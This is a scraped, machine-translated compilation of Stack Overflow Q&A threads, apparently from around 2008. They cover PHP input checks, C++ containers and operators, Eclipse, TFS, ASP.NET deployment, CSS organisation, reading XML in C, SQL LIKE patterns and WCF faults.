                return sanitize($_REQUEST[$key]);

         return $default;
    }

    // basics. Enforce it with filters according to your needs
    function sanitize($data)
    {
          return addslashes(trim($data));
    }

    // your rules here
    function isEmptyString($data)
    {
        return (trim($data) === "" or $data === null);
    }

    function exists($key) {}

    function setFlash($name, $value) {}

    [...]

}

$request = new Request();
$question= $request->get('question', '', 'post');
print $request->isEmptyString($question); 
```

Symfony 大量使用这种糖。

但是您所说的不止于此，您的“// 此处处理错误”。您正在混合 2 个工作：获取数据并处理它。这根本不一样。

您可以使用其他机制来验证数据。同样，框架可以向您展示最佳实践。

创建代表表单数据的对象，然后附加进程并回退到它。这听起来比破解一个快速的 PHP 脚本要做的工作要多得多（这是第一次），但它是可重用的、灵活的，而且更不容易出错，因为使用普通 PHP 进行的表单验证往往很快就会变成意大利面条代码。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2017-03-26T00:43:37.050

这个检查数组*和*字符串：

```
function is_set($val) {
  if(is_array($val)) return !empty($val);

  return strlen(trim($val)) ? true : false;
} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-04-24T13:06:06.057

为了更健壮（制表，返回......），我定义：

```
function is_not_empty_string($str) {
    if (is_string($str) && trim($str, " \t\n\r\0") !== '')
        return true;
    else
        return false;
}

// code to test
$values = array(false, true, null, 'abc', '23', 23, '23.5', 23.5, '', ' ', '0', 0);
foreach ($values as $value) {
    var_export($value);
    if (is_not_empty_string($value)) 
        print(" is a none empty string!\n");
    else
        print(" is not a string or is an empty string\n");
} 
```

来源：

*   [https://www.php.net/manual/en/function.is-string.php](https://www.php.net/manual/en/function.is-string.php)
*   [https://www.php.net/manual/en/function.trim.php](https://www.php.net/manual/en/function.trim.php)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2016-04-01T04:04:53.380

当您要检查是否为某个字段提供了值时，该字段可能是 a `string`、 an`array`或未定义的。所以，以下就足够了

```
function isSet($param)
{
    return (is_array($param) && count($param)) || trim($param) !== '';
} 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-02-15T10:51:39.630

empty() 曾经为此工作，但 empty() 的行为已经改变了好几次。与往常一样，php 文档始终是准确行为的最佳来源，并且这些页面上的评论通常提供了随时间变化的良好历史记录。如果要检查是否缺少对象属性，目前一个非常防御的方法是：

```
if (is_object($theObject) && (count(get_object_vars($theObject)) > 0)) { 
```

# c++ - 针对 resize() + 迭代器的循环 push_back

> ID：381267
> 
> 赞同：2
> 
> 时间：2008-12-19T15:25:42.857
> 
> 标签：c++, stl

简单的问题；什么更好，为什么？

```
 out.resize( in.size() );
    T1::iterator outit = out.begin();
    for( inIt = in.begin() to end, ++inIt, ++outIt )
       *outit = *inIt
OR

    out.erase();
    for( inIt = in.begin() to end, ++inIt )
        out.push_back( inIt ); 
```

我假设 push_back 中隐含的内存分配值得避免，但要确保。

谢谢

编辑：感谢 out = in 建议伙计们 ;)。我正在玩的实际代码是：

```
 template//can't stop the browser ignoring th class T1, class T2 in angle brackets
bool asciihex( T1& out, const T2& in )
{
    //out.erase();
    out.resize( in.size() / 2 );
    if( std::distance( in.begin(), in.end() ) % 2 )//use distance rather than size to minimise the requirements on T2?
        return false;
    for( T2::const_iterator it = in.begin(); it != in.end(); it += 2 )
    {
        out.push_back(((( (*it > '9' ? *it - 0x07 : *it)  - 0x30)  '9' ? *(it+1) - 0x07 : *(it+1)) - 0x30) & 0x000f));
    }
    return true;
}

template
bool asciihex( T1& out, const T2& in )
{
    size_t size = in.size();
    if( size % 2 )//use distance rather than size to minimise the requirements on T2?
        return false;
    out.resize( size / 2 );
    T1::iterator outit = out.begin();
    for( T2::const_iterator it = in.begin(); it != in.end(); it += 2, ++outit )
    {
        *outit = ((( (*it > '9' ? *it - 0x07 : *it)  - 0x30)  '9' ? *(it+1) - 0x07 : *(it+1)) - 0x30) & 0x000f);
    }
    return true;
} 
```

编辑：我已将 push_back 标记为答案，因为它似乎是共识，因此对遇到相同问题的其他人更有用。但是，我最终使用了迭代器方法，因为我感兴趣的容器类之一不支持 push_back... 里程各不相同。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T17:16:06.157

第二个，如果您担心多个扩展，请使用 out.reserve()。添加到向量的正确答案几乎总是 push_back 或 back_inserter，这避免了一些可能的问题（例如，异常保证、构造函数、写到末尾），您必须使用其他方法注意这些问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-19T15:34:30.123

第二种，只要你先预留合适的容量。

我看到的一个问题（除了风格）是，在第一个问题中，如果你的复制分配抛出，你已经采取了一个应该给你强有力保证的操作，并用它来给出不保证。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T16:26:58.957

如果您关心保存`in`，请执行以下操作：

```
out = in; 
```

如果您不这样做，请执行以下操作：

```
std::swap(out, in); 
```

如果 out 和 in 是不同类型的容器，请尝试以下操作：

```
out.erase(out.begin(), out.end());
// if it's a vector or other contiguous memory container, you'll want to reserve first
// out.reserve(in.size());
std::copy(in.begin(), in.end(), back_inserter(out)); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T16:18:38.600

那么这有什么问题呢？

```
out = in; 
```

你不认为那会有最好的行为吗？如果没有，那就糟透了。

此外，您的两个代码示例应该是

```
out.resize( in.size() );
T1::iterator outIt = out.begin();
for( T1::iterator inIt = in.begin(); inIt != in.end(); ++inIt, ++outIt )
   *outIt = *inIt; 
```

和

```
out.erase(out.begin(), out.end());
for( T1::iterator inIt = in.begin(); inIt != in.end(); ++inIt )
    out.push_back( *inIt ); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T16:47:48.023

如果您正在处理整数或双精度值等简单值，则调整大小并设置或保留和 push_back 将无关紧要（性能方面）。

如果您正在处理具有重要构造函数的更复杂的对象，最好使用第二个基于 push_back 的方法。

如果您的对象没有有意义的默认构造函数，那么 push_back 方法是唯一有效的技术。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-24T00:09:03.327

`push_back`与在调整大小的向量上使用 [] 运算符相比，我在基于 - 的解决方案中的性能更差。造成差异的原因是每次执行`push_back`.

更糟糕的是，编译器决定它不能内联对 的调用`push_back`，但它确实将保留逻辑内联到`push_back`方法中。这给了函数调用的开销，并且调用的函数不必要的大。即使经过一些 force_inline 按摩，它也没有基于 [] 运算符的循环快。

基于迭代器或 [] 运算符的循环除了写入值外不会做任何事情，至少在使用简单类型时不会。如果使用更高级的类型，则在调整向量大小时默认构造函数的成本可能会破坏潜在的胜利。

Anyway, if your program spends most of its time in these kinds of loop I definitely think you should benchmark the different solutions and see if there are any performance to gain by using one of the solutions. If you are not spending considerable amount of your execution time in the function you described, you shouldn't care about this post :)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-24T01:15:14.737

I prefer push_back over array assignment as push_back will work with or without randomaccessiterators. Array assignment requires them. If you force randomaccessiterators now you can't easily change the container in the future. Of course, to avoid resize issues you call vector::capacity instead of resize.

# eclipse - Eclipse - 保存工作区的问题

> ID：381273
> 
> 赞同：6
> 
> 时间：2008-12-19T15:27:01.887
> 
> 标签：eclipse

定期（在自动保存期间）并在关闭时得到：

**保存工作空间的问题**

```
(X) Problems occurred while trying to save the state of the workbench.

Details >>
  Could not write metadata for '/projectname'. 
  encoded string too long: 123456 bytes 
```

使用通常的方法无法找到原因或解决方案。任何想法如何解决？这是使用 eclipse 3.4 (Ganymede)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-20T06:04:12.193

它应该与[DataOuputStream](http://www.docjar.com/html/api/java/io/DataOutputStream.java.html)中的一个错误有关，即它不能用长于 65535 utflen 的方式写入 UTF。

如果我是你，我会尝试找到减少数据大小的方法，并将错误报告提交给 Eclipse 和 JRE。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-23T08:02:43.240

在 Vista x64 下开始遇到同样的问题。最新的[JRE](http://java.com/en/download/manual.jsp)似乎没有相同的 DataOuputStream 限制，因此安装它可以解决烦恼。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-08T19:12:19.340

我对这些事件的观察是，它们只发生在我创建项目的同一个 Eclipse 会话期间新创建的项目上。重新启动 Eclipse 后，直到下次创建新项目时，我才会再次看到该问题。

有没有其他人注意到他们发生错误的情况？

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-20T05:43:46.320

这不是写权限或磁盘空间问题。我在 Eclipse 3.5 M4 上遇到了同样的问题。3.4.1 没有问题。

# visual-studio - 在 TFS 中，我可以使用添加的“进行中”状态来确定任务需要多长时间？

> ID：381277
> 
> 赞同：1
> 
> 时间：2008-12-19T15:27:48.060
> 
> 标签：visual-studio, visual-studio-2008, tfs

我已经修改了 TFS 中的敏捷任务模板以包含一个新的“进行中”状态。当项目开始工作时，“分配的用户”会将任务从“活动”设置为“进行中”。这有助于我了解哪些任务已启动。

然而，我想我也许可以使用这个新状态来计算出事情需要多长时间。有没有办法可以区分“进行中”和“关闭”状态的“状态更改日期”？

开箱即用的 TFS 查询似乎是有限的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T15:53:57.883

我无权访问 TFS，所以我不确定这是否已经构建无法确认，但您可以选择向工作项添加两个新字段，用于开始和停止日期。当您进入和退出一个状态时，您可以让工作流设置这些变量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T15:40:05.493

我也很好奇答案。

但是，要考虑的一件事是，如果任务在周末运行，如果您正在寻找“开发人员日”的衡量标准，那么您不希望将这些日子考虑在内。更进一步，如果能够以某种方式定义不会发生工作的日期（例如办公室关闭时）以更准确地反映所花费的时间，那就太好了。

# asp.net-mvc - 将 MVC 应用程序部署到桌面计算机的简单方法？

> ID：381282
> 
> 赞同：1
> 
> 时间：2008-12-19T15:28:28.373
> 
> 标签：asp.net-mvc, deployment, mono

我有一个有趣的情况，我需要将 ASP.NET MVC 应用程序部署到（伪老板的）本地桌面计算机，以便他们可以在本地运行它以进行数据输入。在没有安装 Visual Studio 的情况下让应用程序在 vista 机器上运行的最佳方法是什么？

理想情况下，只需单击一下即可启动开发 Web 服务器并在浏览器中打开页面。

我考虑安装 Visual Web Developer，然后欺骗它的开发网络服务器运行应用程序，甚至安装单声道，因为它具有很好的“在此处启动 xsp”功能，即使是非技术人员也能理解。最重要的是这个人不是很技术，所以他们需要很容易启动和停止应用程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T15:31:51.593

您需要安装 IIS，它应该适用于 Vista。然后只需设置一个工作目录并将您的应用程序放在那里，这不是一键点击，而是可能.,.. 5.. :)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T15:49:44.960

[Microsoft Web 平台安装程序](http://www.microsoft.com/web/channel/products/WebPlatformInstaller.aspx)怎么样？您仍然需要添加自己的应用程序，但它会处理 .NET、IIS 和依赖项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-14T15:44:09.023

您能否使用 UltiDev Cassini 之类的东西：[http](http://www.ultidev.com/products/Cassini/) ://www.ultidev.com/products/Cassini/并构建您自己的安装程序来为您的用户设置一切？

# css - 用于类型、颜色和布局的不同样式表。什么去哪里？

> ID：381295
> 
> 赞同：3
> 
> 时间：2008-12-19T15:32:04.510
> 
> 标签：css, typography

我在“A List Apart”上看到了[这篇文章](http://www.alistapart.com/articles/progressiveenhancementwithcss)，该文章建议将 css 信息拆分为（至少）三个单独的文件，一个用于排版，一个用于布局，一个用于颜色信息。颜色看起来很明显，但是您将如何向您的普通程序员（即我）解释什么是类型和什么是布局？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T15:36:45.500

排版是字体（字体）、它们的大小、间距、字距调整等。

layout是元素（div、span等）的定位、间距等。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T15:41:52.683

类型将与文本本身有关。

布局将与框（表格、div 等）有关

就我个人而言，我会将布局和文本保存在同一个文件中，因为有时会指示另一个文件，并且字体信息往往很少（在我的项目中......）。

# c - 如何将 XML 文件读入 C 中的缓冲区？

> ID：381300
> 
> 赞同：6
> 
> 时间：2008-12-19T15:33:27.253
> 
> 标签：c, xml

我想`char *buffer`使用 C将 XML 文件读入。

做这个的最好方式是什么？

我应该如何开始？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-12-20T13:05:30.580

如果您想*解析*XML，而不仅仅是将其读入缓冲区（不是特定于 XML 的东西，请参阅 Christoph 和 Baget 的答案），您可以使用例如[libxml2](http://xmlsoft.org/)：

```
#include <stdio.h>
#include <string.h>
#include <libxml/parser.h>

int main(int argc, char **argv) {
   xmlDoc *document;
   xmlNode *root, *first_child, *node;
   char *filename;

   if (argc < 2) {
     fprintf(stderr, "Usage: %s filename.xml\n", argv[0]);
     return 1;
   }
   filename = argv[1];

  document = xmlReadFile(filename, NULL, 0);
  root = xmlDocGetRootElement(document);
  fprintf(stdout, "Root is <%s> (%i)\n", root->name, root->type);
  first_child = root->children;
  for (node = first_child; node; node = node->next) {
     fprintf(stdout, "\t Child is <%s> (%i)\n", node->name, node->type);
  }
  fprintf(stdout, "...\n");
  return 0;
} 
```

在 Unix 机器上，您通常使用以下命令编译上述内容：

```
% gcc -o read-xml $(xml2-config --cflags) -Wall $(xml2-config --libs) read-xml.c 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T17:03:53.453

将文件的内容读入一个简单的缓冲区*真的*是您想要做的吗？XML 文件通常需要解析，您可以使用[libxml2](http://xmlsoft.org/)之类的库来执行此操作，仅举一个示例（但值得注意的是，它是用 C 实现的）。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-12-19T23:58:37.453

希望没有错误的 ISO-C 代码可以读取文件的内容并添加 '\0' 字符：

```
#include <stdlib.h>
#include <stdio.h>

long fsize(FILE * file)
{
    if(fseek(file, 0, SEEK_END))
        return -1;

    long size = ftell(file);
    if(size < 0)
        return -1;

    if(fseek(file, 0, SEEK_SET))
        return -1;

    return size;
}

size_t fget_contents(char ** str, const char * name, _Bool * error)
{
    FILE * file = NULL;
    size_t read = 0;
    *str = NULL;
    if(error) *error = 1;

    do
    {
        file = fopen(name, "rb");
        if(!file) break;

        long size = fsize(file);
        if(size < 0) break;

        if(error) *error = 0;

        *str = malloc((size_t)size + 1);
        if(!*str) break;

        read = fread(*str, 1, (size_t)size, file);
        (*str)[read] = 0;
        *str = realloc(*str, read + 1);

        if(error) *error = (size != (long)read);
    }
    while(0);

    if(file) fclose(file);
    return read;
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-07-13T13:22:36.617

1.  在 Visual Studio 中将 libxml2 作为 NuGet 包安装（我正在使用 Vs 2015 进行测试）
2.  将示例 XML 文件下的内容复制并粘贴到记事本中，并将文件另存为 example.xml
3.  将//xml解析下的代码复制并粘贴到Vs中
4.  使用 xml 文件名作为参数从 main 调用函数
5.  您将在 configReceive 中获取 xml 数据

就这样...

示例 XML 文件：

```
<?xml version="1.0" encoding="utf-8"?>
    <config>
        <xmlConfig value1="This is a simple XML parsing program in C"/>
        <xmlConfig value2="Thank you : Banamali Mishra"/>
        <xmlConfig value3="2000000"/>
        <xmlConfig value4="80"/>
        <xmlConfig value5="10"/>
        <xmlConfig value6="1"/>
    </config> 
```

这是源代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libxml/xmlreader.h>
#include <libxml/xmlmemory.h>
#include <libxml/parser.h>

char configReceive[6][80] = { " " };

//xml parsing
void ParsingXMLFile(char *filename) {
    char         *docname;
    xmlDocPtr    doc;
    xmlNodePtr   cur;
    xmlChar      *uri;
    char config[6][80] = { "value1", "value2", "value3", "value4", "value5", "value6" };
    int count = 0;
    int count1 = 0;

    docname = filename;
    doc = xmlParseFile(docname);
    cur = xmlDocGetRootElement(doc);
    cur = cur->xmlChildrenNode;
    while (cur != NULL) {
        if ((!xmlStrcmp(cur->name, (const xmlChar *)"xmlConfig"))) {
            uri = xmlGetProp(cur, (xmlChar *)config[count++]);
            strcpy(configReceive[count1++], (char *)uri);
            xmlFree(uri);
        }
        cur = cur->next;
    }

    count = 0;
    count1 = 0;
    xmlFreeDoc(doc);
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T15:41:12.620

您可以使用 stat() 函数来获取文件大小。然后在使用 fread 读取文件后使用 malloc 分配一个缓冲区。

代码将是这样的：

```
struct stat file_status;
char *buf = NULL;
FILE * pFile;

stat("tmp.xml", &file_status);
buf = (char*)malloc(file_status.st_size);
pFile = fopen ("tmp.xml","r");
fread (buf,1,file_status.st_size,pFile);

fclose(pFile); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T18:09:49.700

这是一个将整个 XML 文件（实际上是*任何*文件）读入缓冲区的完整程序。它包括尽可能多的错误检查。

注意一切都在`main()`. 将其转换为可调用函数留给读者作为练习。

（经过测试，使用 GCC 4.3.3 编译。开关是`-Wall -W --pedantic --ansi`。）

对此的评论将在大约八小时内处理。

```
#include <stdio.h>
#include <stdlib.h>

int main (int argc, char *argv[]) {
 char   *buffer;        /* holds the file contents. */
 size_t  i;             /* indexing into buffer. */
 size_t  buffer_size;   /* size of the buffer. */
 char   *temp;          /* for realloc(). */
 char    c;             /* for reading from the input. */
 FILE   *input;         /* our input stream. */

 if (argc == 1) {
      fprintf(stderr, "Needs a filename argument.\n");
      exit(EXIT_FAILURE);
 }
 else if (argc > 2) {
      fprintf(stderr, "Well, you passed in a few filenames, but I'm only using %s\n", argv[1]);
 }

 if ((input = fopen(argv[1], "r")) == NULL) {
      fprintf(stderr, "Error opening input file %s\n", argv[1]);
      exit(EXIT_FAILURE);
 }

 /* Initial allocation of buffer */
 i = 0;
 buffer_size = BUFSIZ;
 if ((buffer = malloc(buffer_size)) == NULL) {
      fprintf(stderr, "Error allocating memory (before reading file).\n");
      fclose(input);
 }

 while ((c = fgetc(input)) != EOF) {
      /* Enlarge buffer if necessary. */
      if (i == buffer_size) {
       buffer_size += BUFSIZ;
       if ((temp = realloc(buffer, buffer_size)) == NULL) {
        fprintf(stderr, "Ran out of core while reading file.\n");
        fclose(input);
        free(buffer);
        exit(EXIT_FAILURE);
       }
       buffer = temp;
      }

      /* Add input char to the buffer. */
      buffer[i++] = c;
 }

 /* Test if loop terminated from error. */
 if (ferror(input)) {
      fprintf(stderr, "There was a file input error.\n");
      free(buffer);
      fclose(input);
      exit(EXIT_FAILURE);
 }

 /* Make the buffer a bona-fide string. */
 if (i == buffer_size) {
      buffer_size += 1;
      if ((temp = realloc(buffer, buffer_size)) == NULL) {
       fprintf(stderr, "Ran out of core (and only needed one more byte too ;_;).\n");
       fclose(input);
       free(buffer);
       exit(EXIT_FAILURE);
      }
      buffer = temp;
 }
 buffer[i] = '\0';

 puts(buffer);

 /* Clean up. */
 free(buffer);
 fclose(input);

 return 0;
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-21T06:09:15.583

我相信这个问题是关于 XML 解析而不是关于文件读取的，但是 OP 应该真正澄清这一点。
任何方式你都有很多例子如何读取文件。
除了[sgm](https://stackoverflow.com/questions/381300/how-can-i-read-an-xml-file-into-a-buffer-in-c#381547)建议之外，xml 解析的另一个选项是[Expat 库](http://expat.sourceforge.net/)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-12-21T08:12:20.093

# 建议：使用内存映射

这有可能减少无用的数据复制。诀窍是向操作系统询问您想要什么，而不是这样做。这是我之前做的一个实现：

## 映射.h

```
#ifndef MMAP_H
#define MMAP_H

#include <sys/types.h>

struct region_t {
  void *head;
  off_t size;
};

#define OUT_OF_BOUNDS(reg, p) \
  (((void *)(p) < (reg)->head) || ((void *)(p) >= ((reg)->head)+(reg)->size))

#define REG_SHOW(reg) \
  printf("h: %p, s: %ld (e: %p)\n", reg->head, reg->size, reg->head+reg->size);

struct region_t *do_mmap(const char *fn);
#endif 
```

## 映射.c

```
#include <stdlib.h>

#include <sys/types.h>  /* open lseek             */
#include <sys/stat.h>   /* open                   */
#include <fcntl.h>      /* open                   */
#include <unistd.h>     /*      lseek             */
#include <sys/mman.h>   /*            mmap        */

#include "mmap.h"

struct region_t *do_mmap(const char *fn)
{
  struct region_t *R = calloc(1, sizeof(struct region_t));

  if(R != NULL) {
    int fd;

    fd = open(fn, O_RDONLY);
    if(fd != -1) {
      R->size = lseek(fd, 0, SEEK_END);
      if(R->size != -1) {
        R->head = mmap(NULL, R->size, PROT_READ, MAP_PRIVATE, fd, 0);
        if(R->head) {
          close(fd); /* don't need file-destructor anymore. */
          return R;
        }
        /*                no clean up of borked (mmap,) */
      }
      close(fd);   /* clean up of borked (lseek, mmap,) */
    }
    free(R); /* clean up of borked (open, lseek, mmap,) */
  }
  return NULL;
} 
```

# c# - VSTO：无法创建工作簿

> ID：381320
> 
> 赞同：2
> 
> 时间：2008-12-19T15:38:55.933
> 
> 标签：c#, .net, visual-studio, vsto

当我尝试在 VS 中创建 Excel 或 Word 工作簿项目时，我收到以下消息：

> 此计算机上未安装兼容版本的 Microsoft Office。您必须安装与您的项目兼容的 Office 版本。此外，通过运行安装程序并选择“修复”选项，修复适用于您的项目的 Visual Studio Tools for Office 运行时版本。运行时可在 Microsoft 下载中心获得。

我安装了 VS 2008 和 Office 2003 Professional SP 3。我完成了 Office 的完整安装，看起来 Interop DLL 在 GAC 中。我正在创建一个 Office 2003 项目。我尝试了[VSTO 问题中的步骤 - 无法创建 Visual Studio excel 工作簿项目](https://stackoverflow.com/questions/274653/vsto-problem-cannot-create-visual-studio-excel-workbook-project)。我在安装 Office 2003 Pro 后从磁盘修复了 VS 2008。我之前安装了 Office 2003 Standard，但在安装 Office 2003 Pro 之前将其删除。我能够创建加载项。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T16:14:38.247

Office 2k3 Standard 与 VSTO 不兼容；从 2k3 标准升级可能会在您的注册表中留下一些东西。

[该线程](http://social.msdn.microsoft.com/Forums/en-US/vsto/thread/3f12200d-f685-4bc9-bff0-d380067f515a)表明，在这种情况下，即使迁移到 2k7 也不会提供兼容性！创建一个新的用户配置文件怎么样？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T16:53:17.297

以下步骤有效：

1）卸载Office Pro，重新启动并重新安装。

2）从磁盘修复VS 2008。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-04T14:02:21.957

我也有同样的问题，但我安装了 office2003 sp3，现在它工作正常

# sql-server - 如何在数据库字段中查找特定模式？

> ID：381323
> 
> 赞同：0
> 
> 时间：2008-12-19T15:39:12.920
> 
> 标签：sql-server, tsql

我有一列包含 C5、C6、C3、CC、CA、CD 等字段。

我希望能够找到所有包含字母和数字的列，例如 C5 和 C6。

我知道我是否这样做：

```
SELECT * FROM TABLE WHERE FIELD LIKE 'C%' 
```

它也会返回 CC、CA、CD，但我不希望这样，我只想返回那些数字。我还想更新此列删除数字，因此 C5 变为 C，C6 变为 C，依此类推。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-19T15:43:46.733

查询将是`SELECT * FROM TABLE WHERE FIELD LIKE 'C[0-9]%'`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T15:42:49.293

[尝试从这里开始](http://msdn.microsoft.com/en-us/library/aa933232(SQL.80).aspx)

Microsoft 对 Like 的参考提供了有关您可以在该类型语句中使用的表达式的信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T18:15:47.863

您真正需要做的是重新设计您的结构，因为您不应该以这种方式存储数据。子表是存储此类数据的方式，然后您可以轻松查询和更新。已接受的解决方案的问题是，如果文本不以 C 开头，您仍然会遇到麻烦，并且如果在同一文本组中有多个 C5、C6，则更新充其量是不准确的。这违反了数据库设计的绝对第一规则，每行的列中永远不要存储超过一条信息。

如果您真的想要一种准确的方法来查找和更新这些记录（即使您无法更改结构），您需要将它们拉出到一个相关的临时表中，该表具有 record_Id 和 value 以及更新的位列。然后找到带数字的并更新它们和同时提交的更新标志。然后对于具有至少一个标志的记录 ID，您将重新创建字符串并更新记录本身。如果 C5 和 C6 都在数据字符串中，您还需要决定是否只需要 C 的两个值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-19T18:27:37.243

使用其中任何一个

```
select LEFT(col,1) from @t where col like 'c[0-9]%'

select substring(col,1,1) from @t where col like 'c[0-9]%' 
```

# c++ - 一个操作符 ==，其参数是非常量引用

> ID：381324
> 
> 赞同：2
> 
> 时间：2008-12-19T15:39:24.717
> 
> 标签：c++, operators, constants, equals-operator

我[这个帖子](https://stackoverflow.com/questions/381164)，我看过这个：

```
class MonitorObjectString: public MonitorObject {
    // some other declarations
    friend inline bool operator==(/*const*/ MonitorObjectString& lhs,
                                  /*const*/ MonitorObjectString& rhs)
    { return lhs.fVal==rhs.fVal; }
} 
```

* * *

在我们继续之前，**这非常重要：**

*   我**不是在质疑**任何人的编码能力。
*   我**只是想知道**为什么有人在比较中需要非常量引用。
*   该[问题的发布](https://stackoverflow.com/questions/381164) **者没有**编写该代码。

这是以防万一。这也很重要：

*   我添加了`/*const*/`s 并重新格式化了代码。

* * *

现在，我们回到主题：

我想不出一个可以让您修改其按引用参数的等式运算符的合理使用。你？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-19T15:44:34.360

他们很可能忘记了`const`. 运算符重载*应该*表现一致，而不是执行“不合时宜”的操作。

作为一般规则，相等运算符永远不应该修改它正在比较的任何对象。声明`const`在编译器级别强制执行此操作。然而，它经常被遗漏。“常量正确性”在 C++ 中经常被忽视。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-19T15:45:58.290

也许这些类使用了一种惰性初始化形式。当访问数据时，必须进行适当的初始化，并且必须提取数据。这可能会改变班级成员。

但是，可以形成延迟初始化，这样就不需要对类进行修改。这可以通过使用[Pimpl 习惯用法](http://en.wikipedia.org/wiki/Pimpl)（通过指向私有类的指针）或使用[mutable 关键字](https://stackoverflow.com/questions/105014/c-mutable-keyword)（不推荐！）来完成。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T17:00:32.850

你提出的问题有一个更令人费解的问题。

如果我有两个`MonitorObjectString`s 已经是 const，我就不能使用这个相等函数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T15:45:36.357

在这种情况下，显然不需要非常量参数，并且像您一样，我也不认为有任何一般情况。

但是，const 正确性问题肯定会从较低级别的代码向上推，如果您不能从低层纠正它们，那么您可能不得不在更高层解决它们。也许这就是这里发生的事情？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T17:10:14.190

如果您因为修改操作数而不能使用 const，那么您就严重滥用了运算符重载。

如果你不能使用 const 因为实现调用非常量函数，你真的应该清理它们，或者至少提供 const 替代方案。

如果您要调用代码，则无法更改不使用 const 的代码，无论如何我都会使用 const，在最深的可用点使用 const_cast，然后对其进行注释。

正如 Shmoopty 指出的那样，该运算符的用处远没有它应有的有用，因为它不能用于 const 对象，即使其中只有一个是 const。不支持“a == 5”的数字等式运算符将在很大程度上违反最小惊讶法则。

# wcf - 在 WCF 中 - 在“故障”事件中 - 如何获取异常详细信息？

> ID：381345
> 
> 赞同：8
> 
> 时间：2008-12-19T15:45:17.590
> 
> 标签：wcf, exception

我有一个 WCF 服务器，我正在利用“错误”事件，它愚蠢地只给了我“对象发送者，EventArgs e”。如何在该事件中获取当前的“异常”对象？

或者，如果有某种全局系统方式，比如 Environment.GetCurrentException()，那就太棒了，但我找不到。

编辑：为了帮助解释我的期望……在 ASP.NET 中，您可以执行“Server.GetLastError()”……在 WCF 中是否有这样的事情，或者甚至远程关闭的东西？- OperationContext.Current.GetLastError() 会很酷 :)

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-19T16:58:43.260

好的，在使用正确的关键字进行更多谷歌搜索后，我找到了答案： http: [//www.steverb.com/post/Useful-WCF-Behaviors-IErrorHandler](http://www.steverb.com/post/Useful-WCF-Behaviors-IErrorHandler)

# c++ - 轻量级 boost::bind

> ID：381363
> 
> 赞同：5
> 
> 时间：2008-12-19T15:49:51.043
> 
> 标签：c++, function, boost, binders

我厌倦了 pass-callback-data-as-void*-struct 反模式。Boost bind 很好地解决了它，但它是一个不可接受的依赖项。什么是轻量级的替代品？我将如何尽可能简单地自己编写它？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-12-19T16:21:06.957

首先，我质疑你的说法，即它对你来说太重了，无法使用。

其次，如果您需要控制行为，请滚动您自己的模板。

第三，如果你害怕滚动自己的模板，我怀疑你判断它`boost::bind`太重而无法使用的能力。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-12-19T19:54:46.977

查看 Don Clugston 的[快速代表](http://www.codeproject.com/KB/cpp/FastDelegate.aspx)。据说它是您在大多数当前平台上可以找到的最快的委托（编译成 2 条汇编指令。） 1.4+ 版获得了一些 Boost.Bind 兼容性。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T16:13:29.343

我不熟悉 boost:bind，但它是这样的吗？

```
#include <iostream>

void foo (int const& x) {
    std::cout << "x = " << x << std::endl;
}

void bar (std::string const& s) {
    std::cout << "s = " << s << std::endl;
}

template<class T>
void relay (void (*f)(T const&), T const& a) {
    f(a);
}

int main (int argc, char *argv[])
{
    std::string msg("Hello World!");
    relay (foo, 1138);
    relay (bar, msg);
} 
```

输出 -

```
x = 1138
s = Hello World! 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T16:16:18.947

一个常见的 C++ 习惯用法是使用函子（即覆盖 operator() 的对象）。关键是您使用单个对象来封装要回调的代码以及该代码将作用于的数据。仿函数是手动滚动的，还是使用 boost::bind 和/或 <functional> 生成的，可能不会对运行时开销产生很大影响。

所以而不是：

```
